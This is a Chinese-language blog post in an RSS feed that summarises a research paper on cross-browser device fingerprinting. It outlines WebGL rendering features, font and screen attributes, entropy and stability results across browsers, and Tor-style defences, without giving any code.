title="第一部分"></a>第一部分</h3><p>介绍了借鉴已有技术<code>AmIUnique</code>的部分：WebGL</p><blockquote><p>WebGL（全写Web Graphics Library）是一种3D绘图协议，这种绘图技术标准允许把JavaScript和OpenGL ES 2.0结合在一起，通过增加OpenGL ES 2.0的一个JavaScript绑定，WebGL可以为HTML5 Canvas提供硬件3D加速渲染，这样Web开发人员就可以借助系统显卡来在浏览器里更流畅地展示3D场景和模型了。<br>而作者后续的新提出的十几项渲染任务，基本是使用了该项技术</p></blockquote><h3 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h3><h4 id="技术改进"><a href="#技术改进" class="headerlink" title="技术改进"></a>技术改进</h4><p>1.屏幕分辨率改进点</p><ul><li>利用屏幕宽度和高度的比率，这样即可不随屏幕的缩放级别而改变</li><li>新发现参数availHeight,availWidth,availLeft,availTop,screenOrientation可用于指纹特征</li></ul><p>2.字体列表改进点</p><ul><li>曾经的字体列表基于Flash插件获取字体列表，但本技术采用侧信道方式，测量字体的高度与宽度以确定字体类型(后续文章也对这一块的代码进行了详细分析，的确可以在不支持flask的情况下准确得到支持的渲染字体类型)</li></ul><h4 id="新技术"><a href="#新技术" class="headerlink" title="新技术"></a>新技术</h4><p>1.原子指纹特征<br>通过WebGL使用精心挑选的计算机图形参数<code>texture,anti-aliasing,transparency</code>，渲染任务，然后从渲染输出中提取特征进行分析，以区分不同浏览器</p><p>2.符合指纹特征<br>通过WebGL使用精心挑选的计算机图形参数<code>light</code>，渲染任务，然后从渲染输出中提取特征进行分析，以区分不同浏览器</p><p>(作者为设计了十几项渲染任务，详细任务内容在后续文章中进行阐述，但这一块的结果并未应用到跨浏览器的设备指纹计算中)</p><h3 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h3><p>技术实现的整体架构与细节<br><img src="/images/2018-12-15-18-51-54.png" alt=""><br>(后续文章将结合代码分析该技术架构)</p><h3 id="第四部分"><a href="#第四部分" class="headerlink" title="第四部分"></a>第四部分</h3><p>技术的代码实现（简单介绍了代码量和使用的开源库）<br><img src="/images/2018-12-25-10-26-52.png" alt=""></p><h3 id="第五部分"><a href="#第五部分" class="headerlink" title="第五部分"></a>第五部分</h3><p>技术的实践与数据搜集<br>对<code>Amazon Mechanical Turks</code>和<code>MacroWorkers</code>进行数据搜集，并和当今存在的指纹计算进行比对，得到如下结果：<br>计算公式<br><img src="/images/2018-12-15-19-04-29.png" alt=""><br>其中H(X)是香农熵,x是变量，值是各种概率。P(x)是概率函数。Hm是最坏情况下的熵，即每个指纹都相同，并且我们拥有最大的熵。N是所有指纹的个数。<br><img src="/images/2018-12-15-19-03-04.png" alt=""><br>值得注意的是，我们发现<code>List of Fonts</code>越来越少，到本篇论文只有0.219了，这说明Flash正在逐渐被淘汰</p><p>然后又进行了唯一性和稳定性对比：<br><img src="/images/2018-12-15-19-05-35.png" alt=""><br>可以看出作者的单一浏览器指纹和跨浏览器设备指纹识别率更高更稳定</p><h3 id="第六部分"><a href="#第六部分" class="headerlink" title="第六部分"></a>第六部分</h3><p>实验结果统计与分析</p><h4 id="从浏览器分类上来看"><a href="#从浏览器分类上来看" class="headerlink" title="从浏览器分类上来看"></a>从浏览器分类上来看</h4><p><img src="/images/2018-12-15-19-13-49.png" alt=""><br>每个单元格为：唯一性（跨浏览器稳定性）<br>几个特点：<br>1.IE与Edge与其他的配对的唯一性相对低，因为其均为微软独立开发的<br>2.IE与Edge的稳定性很高，说明其有较多的共享代码<br>3.所有浏览器对Edge浏览器的唯一性都高于其对IE浏览器的唯一性，因为Edge引入更多功能，并严格遵守WebGL，暴露更多指纹信息</p><h4 id="从特征分类来看"><a href="#从特征分类来看" class="headerlink" title="从特征分类来看"></a>从特征分类来看</h4><p><img src="/images/2018-12-15-19-19-39.png" alt=""><br>不难看出<code>List of fonts</code>无论是对单一浏览器还是跨浏览器都有非常重要的作用。但是由于Flash的逐渐淘汰，我们应该选择使用JavaScript来获取<code>List of fonts</code><br> <img src="/images/2018-12-25-10-51-15.png" alt=""><br><img src="/images/2018-12-25-10-43-02.png" alt=""><br>也难怪作者最后的demo，使用了该特性作为跨浏览器指纹特征之一<br><img src="/images/2018-12-25-10-44-48.png" alt=""></p><h3 id="第七部分"><a href="#第七部分" class="headerlink" title="第七部分"></a>第七部分</h3><p>简单提及了指纹识别的防御，主要是tor浏览器为例：<br>1.对浏览器输出做规范化处理<br>2.默认禁用canvas，除非用户开启<br>3.虚拟化，找到近乎所有可用于指纹的特征，将其虚拟化</p><h3 id="第八、九、十部分"><a href="#第八、九、十部分" class="headerlink" title="第八、九、十部分"></a>第八、九、十部分</h3><p>与本文相关技术的相关工作，本文的文献引用以及总结</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>本篇文章主要对web指纹，设备指纹做一个简单介绍，对论文脉络做一个简单梳理。更多技术内容见后续文章。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cla
      
    
    </summary>
    
      <category term="study" scheme="http://skysec.top/categories/study/"/>
    
    
      <category term="study" scheme="http://skysec.top/tags/study/"/>
    
  </entry>
  
</feed>
